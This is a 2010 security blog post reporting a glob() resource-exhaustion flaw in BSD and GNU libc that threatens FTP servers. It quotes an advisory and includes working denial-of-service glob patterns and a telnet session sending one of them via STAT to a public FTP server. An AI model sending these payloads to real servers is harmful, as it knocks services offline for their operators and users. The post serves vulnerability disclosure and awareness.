---
layout: post
title: Flaw in  glob function implementation put FTP servers at risk
date: '2010-10-08T09:08:00.003+02:00'
author: Xavier Garcia
tags:
- glob
- vulnerability
- dos
- ftp
modified_time: '2010-10-08T09:13:13.651+02:00'
blogger_id: tag:blogger.com,1999:blog-8534555958859253862.post-2498250541719385089
blogger_orig_url: http://www.shellguardians.com/2010/10/flaw-in-libcs-glob-implementation-put.html
---
H Security [reports](http://www.h-online.com/security/news/item/Flaw-in-libc-implementation-threatens-FTP-servers-1103319.html) a DoS vulnerability that affects many FTP servers. These servers relay in a flawed implementation of the glob function, that is vulnerable to a resource exhaustion attack.  
  
Quoting H Security,  
  

> The problem exists because GLOB\_LIMIT, a feature added in 2001 to limit the amount of memory used by the glob() function is ineffective. Globbing, as it is called, calls on the glob() function to match wildcard patterns when generating a list of matching file names. Because GLOB\_LIMIT is not effective, it potentially allows a system's main memory to be flooded when processing certain patterns and this may, depending on the hardware used, cause the system to become very slow, cease to respond or even crash as a result.

  
Maksymilian Arciemowicz, the researcher that published the [advisory](http://securityreason.com/achievement_securityalert/89) (Also published in [exploit-db.com](http://www.exploit-db.com/exploits/15215/)),  reported that the main BSD operative systems are affected (OpenBSD, NetBSD, FreeBSD and Solaris) as well as GNU libc.  
  
The advisory confirms that the vulnerability is easily exploitable:  

  
> GLOB_LIMIT
> 
> protect us before attacks like
> 
> */../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*
> 
> because glob will find more patches as in GLOB_LIMIT declared. Anyway, if
> 
> we use path what do not exists (with */.. strings) like
> 
> */../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*blablahaha
> 
> GLOB_LIMIT will be never overflowed. Many combinations of paths, will
> 
> execute this proces a long time. We can also try allocate
> 
> (GLOB_LIMIT-1)*MAXPATHNAMELEN bytes per one process. ~200~300MB

Example:

```
\> telnet ftp.netbsd.org 21

Trying 204.152.190.15...

Connected to ftp.netbsd.org.

Escape character is '^\]'.

220 ftp.NetBSD.org FTP server (NetBSD-ftpd 20100320) ready.

user anonymous

331 Guest login ok, type your name as password.

pass anon@cxib

230-

The NetBSD Project FTP Server located in Redwood City, CA, USA

...

230-

EXPORT NOTICE

  

...

230 Guest login ok, access restrictions apply.

stat

{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}

/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*cx

```
  

this request will generate 100% usage of process a long time. ftpd come into glob(3) and will not fast out. Very similar sympthon was described in vulnerability for glibc strfmon(3)
